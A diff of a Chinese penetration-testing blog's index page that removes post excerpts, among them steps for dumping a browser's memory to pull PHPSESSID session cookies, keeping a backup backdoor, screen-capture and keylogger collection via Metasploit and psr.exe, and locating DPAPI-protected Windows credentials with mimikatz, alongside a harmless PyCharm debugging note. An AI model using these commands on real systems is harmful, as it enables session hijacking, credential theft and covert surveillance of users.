-<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
-strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
-findstr PHPSESSID * .dmp&gt; tmp
-strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
-<li>常用的操作用一个后门</li>
-<li>留一个备用的后门，第一个失效之后启用</li>
-</ol>
-<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
-<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
-post&#x2F;windows&#x2F;gather&#x2F;screen_spy
-
-再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
-
-
-使用Windows自带的PSR截屏：
-psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
-Start-Sleep -s 20;
-psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
-realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
-all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
-living that way. So I began to spend more time away from my computer, with other people, 
-learning to open myself to the world, to feel my emotions, to connect with others, to accept 
-risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
-more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
-my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/04/13/dpapi-pass-dump.html" >通过DPAPI获取windows身份凭证</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-04-13  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
-<ul>
-<li>IE、Chrome密码登陆表单的自动完成</li>
-<li>邮箱客户端用户密码</li>
-<li>FTP管理账户密码</li>
-<li>远程桌面身份密码</li>
-<li>……</li>
-</ul>
-<p>查找本地的Credentials:<br>通常的保存位置:</p>
-<ul>
-<li><code>%appdata%\Microsoft\Credentials</code></li>
-<li><code>%localappdata%\Microsoft\Credentials</code></li>
-<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
-</ul>
-<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
-<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
-mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">**BLOB**
-  dwVersion          : 00000001 - 1
-  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
-  dwMasterKeyVersion : 00000001 - 1
-  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
-  dwFlags            : 20000000 - 536870912 (system ; )
-  dwDescriptionLen   : 00000012 - 18
-  szDescription      : 本地凭据数据
-
-  algCrypt           : 00006610 - 26128 (CALG_AES_256)
-  dwAlgCryptLen      : 00000100 - 256
-  dwSaltLen          : 00000020 - 32
-  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
-  dwHmacKeyLen       : 00000000 - 0
-  pbHmackKey         : 
-  algHash            : 0000800e - 32782 (CALG_SHA_512)
-  dwAlgHashLen       : 00000200 - 512
-  dwHmac2KeyLen      : 00000020 - 32
-  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
-  dwDataLen          : 00002a70 - 10864
-  pbData             : xxxxxxz
-  dwSignLen          : 00000040 - 64
-  pbSign             : xxxxx
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
-<ul>
-<li>IE、Chrome密码登陆表单的自动完成</li>
-<li>邮箱客户端用户密码</li>
-<li>FTP管理账户密码</li>
-<li>远程桌面身份密码</li>
-<li>……</li>
-</ul>
-<p>查找本地的Credentials:<br>通常的保存位置:</p>
-<ul>
-<li><code>%appdata%\Microsoft\Credentials</code></li>
-<li><code>%localappdata%\Microsoft\Credentials</code></li>
-<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
-</ul>
-<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
-<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
-mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">**BLOB**
-  dwVersion          : 00000001 - 1
-  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
-  dwMasterKeyVersion : 00000001 - 1
-  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
-  dwFlags            : 20000000 - 536870912 (system ; )
-  dwDescriptionLen   : 00000012 - 18
-  szDescription      : 本地凭据数据
-
-  algCrypt           : 00006610 - 26128 (CALG_AES_256)
-  dwAlgCryptLen      : 00000100 - 256
-  dwSaltLen          : 00000020 - 32
-  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
-  dwHmacKeyLen       : 00000000 - 0
-  pbHmackKey         : 
-  algHash            : 0000800e - 32782 (CALG_SHA_512)
-  dwAlgHashLen       : 00000200 - 512
-  dwHmac2KeyLen      : 00000020 - 32
-  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
-  dwDataLen          : 00002a70 - 10864
-  pbData             : xxxxxxz
-  dwSignLen          : 00000040 - 64
-  pbSign             : xxxxx
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/12/13/python-debug.html" >Pycharm远程调试Docker</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-12-13  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>调试的流水账:</p>
-<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
-<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>没毛病就表示安装成功。</p>
-<p>这个pycharm的包一般在这个目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后配置pycharm:</p>
-<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
-
-Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
-
-添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
-
-Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
-	
-
-	</div>
-  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>调试的流水账:</p>
-<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
-<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>没毛病就表示安装成功。</p>
-<p>这个pycharm的包一般在这个目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后配置pycharm:</p>
-<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
-
-Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
-
-添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
-
-Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
-	
-	</div>
-  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -624,7 +644,7 @@ Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" cla
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -645,23 +665,23 @@ Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" cla
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
+      </li>
+    
+      <li>
         <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
-      </li>
-    
-      <li>
-        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
   </ul>
